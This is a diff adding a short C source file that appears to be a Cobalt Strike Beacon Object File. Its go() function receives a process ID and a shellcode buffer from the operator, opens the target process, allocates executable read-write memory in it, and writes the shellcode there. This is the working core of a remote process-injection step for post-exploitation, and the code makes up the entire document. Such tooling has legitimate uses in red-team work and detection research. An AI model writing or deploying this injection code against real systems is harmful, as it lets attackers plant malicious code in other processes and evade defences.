@@ -1,0 +1,65 @@
+#include <windows.h>
+#include "beacon.h"
+
+
+DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess (DWORD, BOOL, DWORD);
+DECLSPEC_IMPORT WINBASEAPI PVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE, LPVOID, DWORD, DWORD, DWORD);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE, LPVOID, LPCVOID, SIZE_T, PVOID);
+
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle (HANDLE);
+
+
+int writeMem(int pid, LPCVOID buf, int bufsize)
+{
+
+    HANDLE pRemoteHandle;
+    LPVOID remote_address;
+    DWORD dwCount;
+
+    pRemoteHandle = KERNEL32$OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
+    if (pRemoteHandle == NULL)
+    {
+            BeaconPrintf(CALLBACK_OUTPUT, "OpenProcess failed");
+            goto end_close;
+    }
+
+    remote_address = KERNEL32$VirtualAllocEx(pRemoteHandle, NULL, bufsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (remote_address == NULL)
+    {
+            BeaconPrintf(CALLBACK_OUTPUT, "VirtualAllocEx");
+            goto end_close;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "Number of bytes allocated = 0x%i", bufsize);
+    BeaconPrintf(CALLBACK_OUTPUT, "Memory allocated at 0x%p", remote_address);
+
+    if (!KERNEL32$WriteProcessMemory(pRemoteHandle,remote_address,buf, bufsize,&dwCount))
+    {
+            BeaconPrintf(CALLBACK_OUTPUT, "WriteProcessMemory failed");
+            goto end_close;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "Number of Bytes written = %i", dwCount);
+    end_close:
+        if(!KERNEL32$CloseHandle(pRemoteHandle)) {
+            BeaconPrintf(CALLBACK_OUTPUT, "Failed to CloseHandle(pRemoteHandle)");
+        }
+    return 0;
+}
+int go(char * args, int length)
+{
+        DWORD shellcodeSize = 0;
+        datap parser;
+        int procId;
+        BeaconDataParse(&parser, args, length);
+        procId = BeaconDataInt(&parser);
+        unsigned char * b = (unsigned char *)BeaconDataExtract(&parser, &shellcodeSize);
+        int res = 0;
+        BeaconPrintf(CALLBACK_OUTPUT, "Opening handle to process ID: %d", procId);
+        BeaconPrintf(CALLBACK_OUTPUT, "Size of shellcode: %i", shellcodeSize);
+        res = writeMem(procId, b, shellcodeSize);
+        if (res != 0)
+        {
+                BeaconPrintf(CALLBACK_OUTPUT, "Writing memory failed");
+        }
+
+        return 0;
+}
